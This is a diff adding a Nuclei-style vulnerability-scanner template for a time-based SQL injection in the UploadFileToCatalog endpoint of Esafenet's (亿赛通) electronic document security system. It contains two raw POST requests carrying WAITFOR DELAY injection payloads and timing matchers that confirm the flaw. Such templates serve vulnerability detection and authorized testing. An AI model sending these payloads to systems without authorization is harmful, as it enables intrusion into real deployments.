@@ -1,0 +1,42 @@
+id: poc-yaml-yisaitong-esafenet-uploadfiletocatalog-sqli
+info:
+  name: "亿赛通电子文档安全管理系统 UploadFileToCatalog SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 亿赛通电子文档安全管理系统
+  description: |
+    亿赛通电子文档安全管理系统 UploadFileToCatalog endpoint is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands.
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=1';WAITFOR DELAY '0:0:5'--
+      - |
+        POST /CDGServer3/policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=1';WAITFOR DELAY '0:0:8'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "CDGServer3"
+      - type: word
+        part: body
+        words:
+          - "<html"
+        negative: true
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
